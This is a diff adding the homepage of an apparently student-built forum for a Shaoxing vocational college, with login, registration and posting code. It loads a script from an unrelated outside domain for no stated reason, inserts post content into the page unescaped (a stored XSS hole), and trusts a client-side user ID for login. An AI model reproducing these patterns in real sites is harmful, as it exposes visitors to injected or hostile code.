@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>绍职论坛——绍兴职业技术学院</title>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta content="black" name="apple-mobile-web-app-status-bar-style" />
+<meta name="keywords" http-equiv="keywords" content="" />
+<meta name="description" http-equiv="description" content="" />
+<link type="image/x-icon" href="favicon.ico" mce_href="favicon.ico" rel="shortcut icon"/>
+<link type="text/css" href="css/foot.css" rel="stylesheet"/>
+<link type="text/css" href="css/index.css" rel="stylesheet"/>
+<link type="text/css" href="css/body.css" rel="stylesheet"/>
+<link type="text/css" href="css/head.css" rel="stylesheet"/>
+    <link rel="stylesheet" href="css/bootstrap.min.css" />
+    <link rel="stylesheet" href="css/common.css" />
+    <script type="text/javascript" src="js/jquery-3.2.1.min.js" charset="utf-8"></script>
+<link type="text/css" href="font/iconfont.css" rel="stylesheet">
+
+
+
+
+</head>
+
+<body>
+<div id="html_top"></div>
+<!--
+<script type="text/javascript">
+    $.ajax({
+        type: 'post',
+        url: '/Action/HtmlHander.do',
+        data: {position:5},
+        dataType: 'html',
+        async: false,
+        success:function(data) {
+            $("#html_top").html(data);
+        }
+    });
+</script>
+-->
+<script type="text/javascript" src="http://www.8673h.com/js/jsonp.js?r=1" charset="utf-8"></script>
+<div class="page-top">
+    <div class="top-w">
+        <div class="top-biang">
+            <div class="left" style="background:#f2f2f2"id="tototo">
+                <span class="tubiao1"></span><span>&nbsp;您好，欢迎来到绍兴职业技术学院论坛！</span>
+                <span id="loginShow"><span>【</span><a onclick="showLoginModal()" alt="登录论坛" title="登录论坛">登录</a><span>】</span>
+                <span>【</span><a onclick="showRegisterModal()" alt="免费注册" title="免费注册">免费注册</a><span>】</span></span>
+            </div>
+            <div  style="background:#f2f2f2;width: 80px;height: 20px; float: right"id="">
+
+                <span>【</span><a onclick="admin()" alt="管理系统" title="管理系统">管理系统</a><span>】</span></span>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="max_width">
+    <div class="bbs_index">
+        <div class="index_l">
+            <img src="/images/logo.png" border="0">
+        </div>
+        <div class="index_r">
+            <div class="shoubig">
+                <div class="list">
+                    <ul class="ming">
+                        <li>帖子</li>
+                    </ul>
+                    <i class="iconfont shangjiao">&#xe601;</i>
+                    <i class="iconfont shangjiao dis_none">&#xe600;</i>
+                </div>
+                <input name="shuo" type="text" class="kuang">
+                <input name="shousuo" type="button" class="ant" value="搜索">
+            </div>
+        </div>
+    </div>
+</div>
+<script type="text/javascript">
+    //搜索
+    $(".list").hover(function(){
+                $(this).addClass("hover");
+                $(this).find("i").each(function(index, element) {
+                    $(this).hasClass("dis_none")? $(this).removeClass("dis_none"):$(this).addClass("dis_none");
+                });
+            },function(){
+                $(this).removeClass("hover");
+                $(this).find("i").each(function(index, element) {
+                    $(this).hasClass("dis_none")? $(this).removeClass("dis_none"):$(this).addClass("dis_none");
+                });
+            }
+    );
+</script>
+<!-- 注册窗口 -->
+<div id="register" class="modal fade" tabindex="-1">
+
+    <div class="modal-dialog" style="margin-top: 100px;">
+
+        <div class="modal-content">
+
+            <div class="modal-body">
+                <button class="close" data-dismiss="modal">
+                    <span>&times;</span>
+                </button> </div>
+
+            <div class="modal-title">
+
+                <h1 class="text-center">注册</h1> </div>
+
+            <div class="modal-body">
+
+                <form class="form-group" action=""target="hidden_frame">
+
+                    <div class="form-group">
+                        <label >用户名</label> <input class="form-control" id="user_name" type="text" placeholder="6-15位字母或数字"> </div>
+
+                    <div class="form-group">
+                        <label >密码</label> <input class="form-control" type="password" id="password" placeholder="至少6位字母或数字"> </div>
+
+                    <div class="form-group">
+                        <label>再次输入密码</label> <input class="form-control" type="password" id="password2" placeholder="至少6位字母或数字"> </div>
+
+                    <div class="form-group">
+                        <label >邮箱</label> <input class="form-control" type="email" placeholder="例如:123@123.com" id="email"> </div>
+
+                    <div class="text-right">
+                        <button class="btn btn-primary" type="submit" onclick="zc()">提交</button> <button class="btn btn-danger" id="giveUp" data-dismiss="modal">取消</button> </div>
+
+                    <a href="" data-toggle="modal" data-dismiss="modal" data-target="#login">已有账号？点我登录</a>
+                </form>
+                <iframe name="hidden_frame" style="display: none;"></iframe>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- 登录窗口 -->
+<div id="login" class="modal fade">
+
+    <div class="modal-dialog" style="margin-top: 100px;">
+
+        <div class="modal-content">
+
+            <div class="modal-body">
+                <button class="close" data-dismiss="modal">
+                    <span>&times;</span>
+                </button> </div>
+
+            <div class="modal-title">
+
+                <h1 class="text-center">登录</h1> </div>
+
+            <div class="modal-body">
+
+                <form class="form-group" action="" target="h_frame">
+
+                    <div class="form-group">
+                        <label  >用户名</label> <input class="form-control" type="text"id="login_name" placeholder=""> </div>
+
+                    <div class="form-group">
+                        <label >密码</label> <input class="form-control" type="password" id="login_password" placeholder=""> </div>
+
+                    <div class="text-right">
+                        <button class="btn btn-primary" type="submit"onclick="login()">登录</button> <button class="btn btn-danger" id="login_give" data-dismiss="modal">取消</button> </div>
+
+                    <a href="" data-toggle="modal" data-dismiss="modal" data-target="#register">还没有账号？点我注册</a>
+                </form>
+                <iframe name="h_frame" style="display: none;"></iframe>
+            </div>
+        </div>
+    </div>
+</div>
+<!--发帖-->
+<div id="post_ing" class="modal fade">
+
+    <div class="modal-dialog" style="margin-top: 100px;">
+
+        <div class="modal-content">
+
+            <div class="modal-body">
+                <button class="close" data-dismiss="modal">
+                    <span>&times;</span>
+                </button> </div>
+
+            <div class="modal-title">
+
+                <h1 class="text-center">发帖</h1> </div>
+
+            <div class="modal-body">
+
+                <form class="form-group" action="" target="post_frame">
+
+                    <div class="form-group">
+                        <label  >标题</label> <input class="form-control" type="text"id="topic" placeholder=""> </div>
+
+                    <div class="form-group">
+                        <label >正文</label> <textarea style="height: 250px;" class="form-control" id="post_content" type="text"placeholder=""></textarea> </div>
+
+                    <div class="text-right">
+                        <button class="btn btn-primary" type="submit"onclick="post_ing()">确定</button> <button class="btn btn-danger" id="post_give" data-dismiss="modal">取消</button> </div>
+
+                    <a href="" data-toggle="modal">论坛规则</a>
+                </form>
+                <iframe name="post_frame" style="display: none;"></iframe>
+            </div>
+        </div>
+    </div>
+</div>
+<!--看帖-->
+<div id="post_look" class="modal fade">
+
+    <div class="modal-dialog" style="margin-top: 100px;">
+
+        <div class="modal-content">
+
+            <div class="modal-body">
+                <button class="close" data-dismiss="modal">
+                    <span>&times;</span>
+                </button> </div>
+
+            <div class="modal-title">
+
+                <h1 class="text-center">查看</h1> </div>
+
+            <div class="modal-body">
+
+                <form class="form-group" action="" target="post_frame">
+
+                    <div class="form-group">
+                        <label  >标题</label> <input class="form-control" type="text"id="topic_look" placeholder=""readonly> </div>
+
+                    <div class="form-group">
+                        <label >正文</label> <textarea style="height: 250px;" class="form-control" id="post_content_look" type="text"placeholder="" readonly></textarea> </div>
+
+                    <div class="text-right">
+                        <button class="btn btn-danger" id="post_give_look" data-dismiss="modal">取消</button> </div>
+
+                    <a href="" data-toggle="modal">论坛规则</a>
+                </form>
+                <iframe name="post_frame" style="display: none;"></iframe>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="bignav">
+   <div class="nav_h">
+      <div class="max_width">
+        <div id="max_nav">
+             <div class="navall">
+                全部社区
+                <i class="iconfont navall_xiao">&#xe601;</i>
+                <i class="iconfont navall_xiao dis_none">&#xe600;</i>
+             </div>
+             <table width="100%" border="0" cellspacing="0" cellpadding="0" class="alllis">
+                  <tr>
+                    <td>
+                      <div class="xingming">
+                           <dl>
+                               <dt>运动</dt>
+                               <dd><a href="#">乒乓</a></dd>
+                               <dd>羽毛球</dd>
+                               <dd>排球</dd>
+                               <dd>足球</dd>
+                               <dd>篮球</dd>
+                           </dl>
+                           <dl>
+                               <dt>动漫</dt>
+                               <dd>国漫</dd>
+                               <dd>日漫</dd>
+                               <dd>韩漫</dd>
+                               <dd>欧美漫</dd>
+                               <dd>迪士尼漫画</dd>
+                           </dl>
+                           <dl>
+                               <dt>水果</dt>
+                               <dd>苹果</dd>
+                               <dd>香蕉</dd>
+                               <dd>菠萝</dd>
+                               <dd>西瓜</dd>
+                               <dd>葡萄</dd>
+                           </dl>
+                        </div>
+                    </td>
+                    <td style="border-left:1px #ccc dashed; border-right:1px #ccc dashed">
+                       <div class="xingming">
+                           <dl>
+                               <dt>风</dt>
+                               <dd>微风</dd>
+                               <dd>龙卷风</dd>
+                               <dd>暴风</dd>
+                               <dd>台风</dd>
+                               <dd>大风</dd>
+                           </dl>
+                           <dl>
+                               <dt>水</dt>
+                               <dd>河水</dd>
+                               <dd>自来水</dd>
+                               <dd>白开水</dd>
+                               <dd>洪水</dd>
+                               <dd>热水</dd>
+                           </dl>
+                           <dl>
+                               <dt>电脑</dt>
+                               <dd>惠普</dd>
+                               <dd>戴尔</dd>
+                               <dd>联想</dd>
+                               <dd>英特尔</dd>
+                               <dd>华硕</dd>
+                           </dl>
+                        </div>
+                    </td>
+                  </tr>
+             </table>
+         </div>
+         <ul class="nav">
+            <li cag="1"><a href="index.html" class="avices">首页</a></li>
+            <li cag="2"><a href="#">校园简介</a></li>
+            <li cag="3"><a href="#">地方风情</a></li>
+            <li><a href="#">活动专区</a></li>
+            <li><a href="#">金牌卖家</a></li>
+         </ul>
+         <div class="p-center"><a href="p-center/andetiezi.jsp" style="color:#fff"><i class="iconfont" style="color:#fff">&#xe604; </i>个人中心</a></div>
+      </div>
+   </div>
+   <div class="navtwo">
+      <div class="max_width">
+          <ol class="navtwo_list list_margin10" id="navtwo2">
+              <li><a href="#">校园简介</a></li>
+              <li><span>|</span><a href="#">分院介绍</a></li>
+              <li><span>|</span><a href="#">自我介绍</a></li>
+          </ol>
+          <ol class="navtwo_list list_margin15" id="navtwo3">
+              <li><a href="#">地方风情</a></li>
+              <li><span>|</span><a href="#">绍兴古镇</a></li>
+              <li><span>|</span><a href="#">鲁镇</a></li>
+          </ol>
+      </div>
+   </div>
+   <div class="nav_z">
+      <div class="max_width">
+         <ul class="navlist">
+            <li><a href="#">论坛文化</a></li>
+            <li><span>|</span><a href="#">论坛起因</a></li>
+            <li><span>|</span><a href="#">论坛介绍</a></li>
+         </ul>
+      </div>
+   </div>
+   <div class="nav_x">&nbsp;</div>
+</div>
+<div class="max_width">
+   <div class="index">
+       <div class="index_one">
+           <div class="index_one_l">
+              <div class="name"><span><i class="iconfont">&#xe603;</i><em>新手</em>指导</span><small>新手最需阅读的信息</small></div>
+              <ul class="new">
+                <li class="pei">
+                   <div class="left"><span class="d1"></span></div>
+                   <div class="center"><a href="#" class="yel">我们论坛建设的目地</a></div>
+                   <div class="right"><a href="#" class="gart">400查看</a></div>
+                 </li>
+                 <li class="pei">
+                   <div class="left"><span class="d2"></span></div>
+                    <div class="center"><a href="#" class="yel">我们论坛建设的作用</a></div>
+                   <div class="right"><a href="#" class="gart">400回复</a></div>
+                 </li>
+                 <li class="pei">
+                   <div class="left"><span class="d3"></span></div>
+                    <div class="center"><a href="#" class="yel">论坛规则</a></div>
+                   <div class="right"><a href="#" class="gart">400回复</a></div>
+                 </li>
+                 <li>
+                   <div class="left"><span class="fusu">4</span></div>
+                   <div class="center"><a href="#" class="gary">论坛立场声明</a></div>
+                   <div class="right"><a href="#" class="gart">400回复</a></div>
+                 </li>
+                 <li>
+                   <div class="left"><span class="fusu">4</span></div>
+                   <div class="center"><a href="#" class="gary">论坛最新功能动态</a></div>
+                   <div class="right"><a href="#" class="gart">400回复</a></div>
+                 </li>
+                 <li>
+                   <div class="left"><span class="fusu">4</span></div>
+                   <div class="center"><a href="#" class="gary">更新维护通知</a></div>
+                   <div class="right"><a href="#" class="gart">400回复</a></div>
+                 </li>
+                 <li>
+                   <div class="left"><span class="fusu">4</span></div>
+                   <div class="center"><a href="#" class="gary">校友之窗</a></div>
+                   <div class="right"><a href="#" class="gart">400回复</a></div>
+                 </li>
+                 <li>
+                   <div class="left"><span class="fusu">9</span></div>
+                   <div class="center"><a href="#" class="gary">加精必备</a></div>
+                   <div class="right"><a href="#" class="gart">400回复</a></div>
+                 </li>
+                 <li>
+                   <div class="left"><span class="fusu">9</span></div>
+                   <div class="center"><a href="#" class="gary">关于学院介绍</a></div>
+                   <div class="right"><a href="#" class="gart">400回复</a></div>
+                 </li>
+              </ul>
+           </div>
+           <div class="index_one_r"><img src="images/tu.png"></div>
+       </div>
+
+       <div class="index_three">
+          <div class="left" id="writer"style="overflow: auto">
+
+          </div>
+          <ul class="right">
+             <li>
+                 <h4><em class="yel"><i class="iconfont">&#xe603;</i>趣味</em>新闻</h4>
+                 <img src="images/new_img.jpg" border="0">
+                 <div class="ta">
+                     <div class="ta_l"><a href="#" class="gary"><i class="iconfont yel">&#xe605;</i>中国首枚奖牌诞生</a></div>
+                     <div class="ta_r"><a href="#" class="gart">40回复</a></div>
+                 </div>
+                 <div class="ta">
+                     <div class="ta_l"><a href="#" class="gary"><i class="iconfont yel">&#xe605;</i>一箭双星成功发射</a></div>
+                     <div class="ta_r"><a href="#" class="gart">40回复</a></div>
+                 </div>
+                 <div class="ta">
+                     <div class="ta_l"><a href="#" class="gary"><i class="iconfont yel">&#xe605;</i>西藏破获电信诈骗</a></div>
+                     <div class="ta_r"><a href="#" class="gart">40回复</a></div>
+                 </div>
+                 <div class="ta">
+                     <div class="ta_l"><a href="#" class="gary"><i class="iconfont yel">&#xe605;</i>海警钓鱼岛巡航</a></div>
+                     <div class="ta_r"><a href="#" class="gart">40回复</a></div>
+                 </div>
+             </li>
+             <li>
+                 <h4><em class="yel"><i class="iconfont">&#xe603;</i>励志</em>故事</h4>
+                 <img src="images/post_img.jpg" border="0">
+                 <div class="ta">
+                     <div class="ta_l"><a href="#" class="gary"><i class="iconfont yel">&#xe605;</i>你的人生是否早已被注定？</a></div>
+                     <div class="ta_r"><a href="#" class="gart">40回复</a></div>
+                 </div>
+                 <div class="ta">
+                     <div class="ta_l"><a href="#" class="gary"><i class="iconfont yel">&#xe605;</i>凡事要尽力而为,也要量力而行</a></div>
+                     <div class="ta_r"><a href="#" class="gart">40回复</a></div>
+                 </div>
+                 <div class="ta">
+                     <div class="ta_l"><a href="#" class="gary"><i class="iconfont yel">&#xe605;</i>浅谈人生的意思,感叹人生</a></div>
+                     <div class="ta_r"><a href="#" class="gart">40回复</a></div>
+                 </div>
+                 <div class="ta">
+                     <div class="ta_l"><a href="#" class="gary"><i class="iconfont yel">&#xe605;</i>年轻的梦没有终点</a></div>
+                     <div class="ta_r"><a href="#" class="gart">40回复</a></div>
+                 </div>
+             </li>
+             <li>
+                 <h4><em class="red"><i class="iconfont">&#xe603;</i>经验</em>分享</h4>
+                 <div class="pic">
+                    <img src="images/share_img.jpg" border="0">
+                    <div class="younei"> <h4><a href="#">新手用户的福音来啦！</a></h4>
+                     你还在茫茫帖子中不知道说些什么,不知道如何回复吗？快来点击查看 <a href="#" class="red">[详细]</a>
+                    </div>
+                 </div>
+                 <div class="ta">
+                     <div class="ta_l"><a href="#" class="gary"><i class="iconfont red">&#xe605;</i>[精华必选]教你如何发帖即成精华</a></div>
+                     <div class="ta_r"><a href="#" class="gart">18回复</a></div>
+                 </div>
+                 <div class="ta">
+                     <div class="ta_l"><a href="#" class="gary"><i class="iconfont red">&#xe605;</i>[速成必选]教你如何快速提高文学水平</a></div>
+                     <div class="ta_r"><a href="#" class="gart">16回复</a></div>
+                 </div>
+                 <div class="ta">
+                     <div class="ta_l"><a href="#" class="gary"><i class="iconfont red">&#xe605;</i>[集赞必选]教你如何在人群中博取眼球</a></div>
+                     <div class="ta_r"><a href="#" class="gart">35回复</a></div>
+                 </div>
+                 <div class="ta">
+                     <div class="ta_l"><a href="#" class="gary"><i class="iconfont red">&#xe605;</i>[提升必读]成为有价值的坛友</a></div>
+                     <div class="ta_r"><a href="#" class="gart">21回复</a></div>
+                 </div>
+             </li>
+             <li>
+                 <h4><em class="red"><i class="iconfont">&#xe603;</i>政策</em>解读</h4>
+                 <div class="pic">
+                    <img src="images/12.png" border="0">
+                   <div class="younei">
+                     <h4><a href="#">实时知晓最新政策</a></h4>
+                   你还在对自己未来茫茫然然吗？你还跟不上社会国家政策的步伐吗？快来点击查看啦！… <a href="#" class="red">[详细]</a>
+                   </div>
+                  </div>
+                 <div class="ta">
+                     <div class="ta_l"><a href="#" class="gary"><i class="iconfont red">&#xe605;</i>大众创业、万众创新</a></div>
+                     <div class="ta_r"><a href="#" class="gart">74回复</a></div>
+                 </div>
+                 <div class="ta">
+                     <div class="ta_l"><a href="#" class="gary"><i class="iconfont red">&#xe605;</i>实施市场化、法治化债转股</a></div>
+                     <div class="ta_r"><a href="#" class="gart">457回复</a></div>
+                 </div>
+                 <div class="ta">
+                     <div class="ta_l"><a href="#" class="gary"><i class="iconfont red">&#xe605;</i>实现区域协调发展就是一代一路</a></div>
+                     <div class="ta_r"><a href="#" class="gart">145回复</a></div>
+                 </div>
+                 <div class="ta">
+                     <div class="ta_l"><a href="#" class="gary"><i class="iconfont red">&#xe605;</i>钢铁、煤炭行业还是去产能和处置僵尸企业的重点领域</a></div>
+                     <div class="ta_r"><a href="#" class="gart">212回复</a></div>
+                 </div>
+             </li>
+          </ul>
+       </div>
+
+   </div>
+</div>
+
+<div id="ftload">
+
+</div>
+<div class="clear"></div>
+<div style="text-align:center; padding-bottom:10px;" id="foot">
+    <div class="footer-third">
+        <p><a href="#" target="_blank" title="关于我们">关于我们</a> | <a href="http://www.sxvtc.com">学校文化</a> | <a href="">诚聘英才</a> | <a href="#" target="_blank">营销中心</a> | <a href="#" target="_blank">欢迎合作</a> | <a href="#">联系方式</a> | <a href="#" target="_blank">服务条款</a> | <a href="#" target="_blank">隐私声明</a> | <a href="#" target="_blank">友情申请</a> | <a href="#">网站地图</a> | <a href="#" target="_blank">提出建议</a> </p>
+        <p style="padding-top:10px;">Copyright &copy; 学生出品 ——非官方授权</p>
+        <p>地址：浙江省绍兴市府山街道亭山路526号 电话：000-000000  经营许可证编号：<a href="#" target="_blank" style="font-size:12px;color:#666; font-weight:500;">浙江123456</a>
+        </p>
+    </div>
+</div>
+<!--<script type="text/javascript" src="js/jquery.min.js" charset="utf-8"></script>-->
+<script type="text/javascript" src="js/jquery.cookie.js" charset="utf-8"></script>
+<script type="text/javascript" src="js/head.js" charset="utf-8"></script>
+<script type="text/javascript">
+var first_user_cook=sessionStorage.getItem('user_id');
+var first_name_cool=sessionStorage.getItem('user_name');
+if(first_name_cool!=null&&first_user_cook!=null)
+{
+    $("span#loginShow").remove();
+    $("#tototo").append("<span ><span>【</span><a onclick= alt='登录论坛' title='登录论坛'>已登录&nbsp;&nbsp;&nbsp;"+first_name_cool+"</a><span>】</span><span ><span>【</span><a onclick='login_out()' alt='登录论坛' title='登录论坛'>退出</a><span>】</span>")
+}
+    function admin(){
+        window.open("http://localhost:8065/Admin.jsp")
+    }
+    var have_login="0";
+    $.ajax({
+        type: 'post',
+        url: '/Action/BbsCardQuery.do',
+        data: {},
+        /*dataType: 'json',*/
+        async: false,
+        success:function(data) {
+            if(data!=null){
+                var str="<span><em><i class='iconfont'>&#xe602;</i>热门</em>关注 </span><span><a onclick='getPosting()' alt='论坛发帖' title='论坛发帖'>论坛发帖</a>&nbsp;&nbsp;&nbsp;<a onclick='need_look_post()' alt='论坛看贴' title='论坛看帖'>论坛看帖</a>&nbsp;&nbsp;&nbsp;<a onclick='need_phone()' alt='联系管理' title='联系管理'>联系管理</a></span>"
+                str+="<ul class='nei'>"
+                for(var i=0;i<data.data[0].rows.length;i++){
+
+                    str+="<li>"
+                    str+="<div class='zuo' onclick='trys()'><img src='images/post_img.jpg' border='0'></div>"
+                    str+="<div class='you'>"
+                    str+="<div class='name'>"
+                    str+="<h4>"+data.data[0].rows[i].topic+"</h4>"
+                    str+="<h5><a onclick='look_post("+i+")'><em>"+data.data[0].rows[i].clicks+" </em>查看 </a><a onclick='replies_post("+i+")'> |<em>"+data.data[0].rows[i].replies+"</em>回复</a></h5>"
+                    str+="<input type='hidden' value='"+data.data[0].rows[i].post_id+"' id='look"+i+"' >"
+                    str+="</div>"
+                    str+="<div class='rong'>"+data.data[0].rows[i].content+"</div>"
+                    str+="<div class='time'>发表于 "+data.data[0].rows[i].create_time+"</div>"
+                    str+="</div>"
+                    str+="</li>"
+
+                }
+                str+="</ul>"
+                $("#writer").append(str);
+            }
+        }
+    });
+    function zc(){/*注册*/
+        $.ajax({
+            type: 'post',
+            url: '/Action/validateLogon.do',
+            data: {user_name:$("#user_name").val(),password:$("#password").val(),password2:$("#password2").val(),email:$("#email").val()},
+            /*dataType: 'json',*/
+            async: false,
+            success:function(data) {
+                if(data!=null){
+                    var user_id=data.data[0].user_id;
+
+                    if(user_id!=null&&user_id!="null"){
+                        console.log(user_id);
+                        sessionStorage.setItem('user_id', user_id);
+                        console.log(sessionStorage.getItem('user_id'));
+                        $("span#loginShow").remove();
+                        sessionStorage.setItem('user_name', $("#user_name").val());
+                        $("#tototo").append("<span ><span>【</span><a onclick= alt='登录论坛' title='登录论坛'>已登录&nbsp;&nbsp;&nbsp;"+$("#user_name").val()+"</a><span>】</span><span ><span>【</span><a onclick='login_out()' alt='登录论坛' title='登录论坛'>退出</a><span>】</span>")
+                        $("button#giveUp").click();
+                        have_login="1";
+                    }else{
+                        sessionStorage.removeItem('user_name');
+                        sessionStorage.removeItem('user_id');
+                        $("button#giveUp").click();
+                    }
+                }else{
+                    sessionStorage.removeItem('user_name');
+                    sessionStorage.removeItem('user_id');
+                    $("button#giveUp").click();
+                }
+            }
+        });
+    }
+    function login(){/*登录*/
+        $.ajax({
+            type: 'post',
+            url: '/Action/BbsLoginAction.do',
+            data: {user_name:$("#login_name").val(),password:$("#login_password").val()},
+            /*dataType: 'json',*/
+            async: false,
+            success:function(data) {
+                /*console.log(data)*/
+                if(data!=null){
+                    var num=data.data[0].rows[0].user_id;
+                    if(num!=null&&num!="null"){
+                        $("span#loginShow").remove();
+                        /*console.log(data)*/
+                        sessionStorage.setItem('user_name', $("#login_name").val());
+                        sessionStorage.setItem('user_id', num);
+                        $("#tototo").append("<span ><span>【</span><a onclick= alt='登录论坛' title='登录论坛'>已登录&nbsp;&nbsp;&nbsp;"+$("#login_name").val()+"</a><span>】</span><span ><span>【</span><a onclick='login_out()' alt='登录论坛' title='登录论坛'>退出</a><span>】</span>")
+                        $("button#login_give").click();
+                        have_login="1";
+
+                    }else{
+                        sessionStorage.removeItem('user_name');
+                        sessionStorage.removeItem('user_id');
+                        $("button#login_give").click();
+                    }
+                }else{
+                    sessionStorage.removeItem('user_name');
+                    sessionStorage.removeItem('user_id');
+                    $("button#login_give").click();
+                }
+
+            }
+        });
+    }
+    function post_ing(){/*发帖*/
+        if(have_login=="0"){
+            alert("请先登录");
+            return false;
+        }
+        $.ajax({
+            type: 'post',
+            url: '/Action/BbsPostAction.do',
+            data: {user_id:sessionStorage.getItem('user_id'),topic:$("#topic").val(),content:$("#post_content").val()},
+            /*dataType: 'json',*/
+            async: false,
+            success:function(data) {
+                /*console.log(data)*/
+                if(data!=null){
+                    var result=data.data[0].result;
+                    if(parseInt(result)>0){
+                        $("button#post_give").click();
+                        $("#writer").empty();
+                        $.ajax({
+                            type: 'post',
+                            url: '/Action/BbsCardQuery.do',
+                            data: {},
+                            /*dataType: 'json',*/
+                            async: false,
+                            success:function(data) {
+                                if(data!=null){
+                                    var str="<span><em><i class='iconfont'>&#xe602;</i>热门</em>关注 </span><span><a onclick='getPosting()' alt='论坛发帖' title='论坛发帖'>论坛发帖</a>&nbsp;&nbsp;&nbsp;<a onclick='getPosting()' alt='论坛看贴' title='论坛看帖'>论坛看帖</a>&nbsp;&nbsp;&nbsp;<a onclick='getPosting()' alt='联系管理' title='联系管理'>联系管理</a></span>"
+                                    str+="<ul class='nei'>"
+                                    for(var i=0;i<data.data[0].rows.length;i++){
+                                        str+="<li>"
+                                        str+="<div class='zuo' onclick='trys()'><img src='images/post_img.jpg' border='0'></div>"
+                                        str+="<div class='you'>"
+                                        str+="<div class='name'>"
+                                        str+="<h4>"+data.data[0].rows[i].topic+"</h4>"
+                                        str+="<h5><a onclick='look_post("+i+")'><em>"+data.data[0].rows[i].clicks+" </em>查看 </a><a onclick='replies_post("+i+")'> |<em>"+data.data[0].rows[i].replies+"</em>回复</a></h5>"
+                                        str+="<input type='hidden' value='"+data.data[0].rows[i].post_id+"' id='look"+i+"' >"
+                                        str+="</div>"
+                                        str+="<div class='rong'>"+data.data[0].rows[i].content+"</div>"
+                                        str+="<div class='time'>发表于 "+data.data[0].rows[i].create_time+"</div>"
+                                        str+="</div>"
+                                        str+="</li>"
+
+                                    }
+                                    str+="</ul>"
+                                    $("#writer").append(str);
+                                }
+                            }
+                        });
+
+                    }else{
+                        sessionStorage.removeItem('user_name');
+                        sessionStorage.removeItem('user_id');
+                        $("button#login_give").click();
+                    }
+                }else{
+                    sessionStorage.removeItem('user_name');
+                    sessionStorage.removeItem('user_id');
+                    $("button#login_give").click();
+                }
+
+            }
+        });
+    }
+    function look_post(i){
+        $('#post_look').modal('show');
+        $("#topic_look").val("");
+        $("post_content_look").val("");
+        $.ajax({
+            type: 'post',
+            url: '/Action/BbsPostLook.do',
+            data: {post_id:$("#look"+i).val()},
+            /*dataType: 'json',*/
+            async: false,
+            success:function(data) {
+                if(data!=null){
+                    $("#topic_look").val(data.data[0].rows[0].topic)
+                    $("#post_content_look").val(data.data[0].rows[0].content)
+                }
+            }
+        });
+    }
+    function replies_post(i){
+        var res=sessionStorage.getItem('user_id')
+        if(res==null||res=="null"){
+            alert("请先登录")
+            return false;
+        }
+        window.open("http://localhost:8065/replies.jsp?post_id="+$("#look"+i).val()+'&user_id='+sessionStorage.getItem('user_id'));
+    }
+    function need_look_post(){
+        alert("请点击相应的帖子查看详情")
+    }
+    function need_phone(){
+        alert("联系方式：0000-00000")
+    }
+    function login_out(){
+        console.log("sahfaiuh")
+        sessionStorage.removeItem('user_name');
+        sessionStorage.removeItem('user_id');
+        location.reload();
+    }
+    /*sessionStorage.setItem('key', 'value');*/
+    window.onbeforeunload = function() {
+        var n = window.event.screenX - window.screenLeft;
+        var b = n > document.documentElement.scrollWidth-20;
+        if(b && window.event.clientY < 0 || window.event.altKey){
+            sessionStorage.removeItem('user_name');
+            sessionStorage.removeItem('user_id');
+        }
+    }
+</script>
+<script type="text/javascript">
+//载入头部和尾部
+////$("<scri" + "pt>" + "</scr" + "ipt>").attr({ src: "http://192.168.2.21:8089/js/jsonp.js?r=" + Math.random(), type: 'text/javascript', id: 'load' }).appendTo($('head'));
+//选项卡
+$("#tabs li a").each(function(index, element) {
+    $(this).hover(function(){
+	  $("#tabs li a").removeClass("current");
+	  $(".tab_conbox li").addClass("tab_con");
+	   var zhi=parseInt($(this).attr("tab"));
+		$("#tab"+zhi).removeClass("tab_con");
+		$(this).addClass("current");
+	});
+
+ });
+$(".tab_conbox li").each(function(index, element) {
+    $(this).hover(function(){
+		$(".tab_conbox li").addClass("tab_con");
+	     $(this).removeClass("tab_con");
+	})
+});
+//搜索
+$(".list").hover(function(){
+    $(this).addClass("hover");
+	$(this).find("i").each(function(index, element) {
+        $(this).hasClass("dis_none")? $(this).removeClass("dis_none"):$(this).addClass("dis_none");
+    });
+},function(){
+	$(this).removeClass("hover");
+	$(this).find("i").each(function(index, element) {
+        $(this).hasClass("dis_none")? $(this).removeClass("dis_none"):$(this).addClass("dis_none");
+    });
+	}
+);
+$(".ming li").each(function(index, element) {
+	$(this).click(function(){
+		var index=$(this).index();
+		var bbj=$(".ming li").eq(0).text();
+		var abj=$(this).text();
+		if(index != 0){
+			$(".ming li").eq(0).text(abj);
+			$(".ming li").eq(1).text(bbj);
+		}
+	});
+});
+
+//头部二级导航
+$(".nav li").each(function(index, element) {
+   $(this).mouseenter(function(e){
+	   	$(".navtwo_list").css("display","none");
+		$(".nav li").removeClass("nav_bg");
+		var index = $(this).index();
+		var cg = $(this).attr("cag");
+		if($("#navtwo"+cg).length == 1){
+			$("#navtwo"+cg).css("display","block");
+			$(".navtwo").css("display","block");
+			$(".navtwo").addClass("navtwo_bg");
+			$(this).addClass("nav_bg");
+		}else{
+			$(this).addClass("nav_ye");
+			
+		}
+	}).mouseleave(function(e){
+		$(this).removeClass("nav_ye");
+		$(".navtwo").css("display","none");
+		});
+});
+
+$(".navtwo").mouseenter(function(e){
+	var index = $(this).index();
+	var cg = $(this).attr("cag");
+	$(".navtwo").css("display","inline");
+	$(".navtwo").addClass("navtwo_bg");
+
+	}).mouseleave(function(e){
+		$(".navtwo").css("display","none");
+	});
+$(".bignav").mouseleave(function(){
+    $(".nav li").removeClass("nav_bg");
+})
+//大分类
+$("#max_nav").mouseenter(function(){
+	$(".alllis").css("display","block");
+		$(".navall").find("i").each(function(index, element) {
+			  $(this).hasClass("dis_none")? $(this).removeClass("dis_none"):$(this).addClass("dis_none");
+		 });
+	
+	}).mouseleave(function(){
+	$(".alllis").css("display","none");
+	$(".navall").find("i").each(function(index, element) {
+        $(this).hasClass("dis_none")? $(this).removeClass("dis_none"):$(this).addClass("dis_none");
+    });
+});
+
+</script>
+<script type="text/javascript" src="js/bootstrap.min.js"></script>
+<script type="text/javascript" src="js/public.js"></script>
+</body>
+</html>
